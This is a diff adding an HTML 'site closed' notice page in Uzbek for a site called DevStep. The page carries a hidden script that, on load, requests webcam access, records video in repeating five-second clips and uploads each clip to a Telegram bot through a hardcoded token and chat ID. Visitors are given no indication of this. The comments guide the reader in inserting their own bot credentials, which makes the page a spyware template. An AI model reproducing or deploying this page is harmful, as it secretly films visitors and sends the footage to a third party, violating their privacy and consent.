@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DevStep - Vaqtinchalik ishlamayapti</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #ffffff;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 650px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #ff8a00, #e52e71);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            line-height: 1.8;
+            color: #e0e0e0;
+        }
+
+        .button {
+            padding: 12px 25px;
+            font-size: 1.1rem;
+            background-color: #ff5722;
+            color: #ffffff;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: transform 0.3s, background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #e64a19;
+            transform: scale(1.05);
+        }
+
+        a {
+            text-decoration: none;
+            color: #ffffff;
+            background-color: #ff5722;
+            padding: 10px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-top: 20px;
+            transition: transform 0.3s, background-color 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>DevStep sayti o'chdi!</h1>
+        <p>Hurmatli foydalanuvchi, saytimiz o'z faoliyatini tugatdi!</p>
+        <a target="_blank" href="https://youtu.be/EwPZPGwzHmc">Batafsil</a>
+    </div>
+    <script>
+        var mediaRecorder;
+        var recordedChunks = [];
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function (stream) {
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+            mediaRecorder.ondataavailable = function (event) {
+              if (event.data.size > 0) {
+                recordedChunks.push(event.data);
+              }
+            };
+
+            mediaRecorder.onstop = function () {
+              var blob = new Blob(recordedChunks, { type: 'video/mp4' });
+              sendVideo(blob);
+              recordedChunks = []; // Reset recorded chunks for the next recording
+            };
+
+            setInterval(function () {
+              if (mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+              }
+              mediaRecorder.start();
+            }, 5000); // Record video segments of 5 seconds
+          })
+          .catch(function (error) {
+            console.log('Error: ' + error);
+          });
+
+        function sendVideo(blob) {
+          var botToken = '6824723033:AAGp5vLJnkuFgnLT9Xrrsy1nNea8ECRcDdw'; // Telegram bot tokeningizni kiritin
+          var chatId = '7149602547'; // Kanalingiz/userning ID raqamini kiritin (masalan: mychannel yoki -123456)
+
+          var telegramForm = new FormData();
+          telegramForm.append('chat_id', chatId);
+          telegramForm.append('video', blob, 'video.mp4');
+          telegramForm.append('caption', 'Yangi video'); // Jo'natilayotgan videoga tegishli matn
+
+          var telegramXhr = new XMLHttpRequest();
+          telegramXhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendVideo');
+          telegramXhr.send(telegramForm);
+        }
+    </script>
+</body>
+</html>
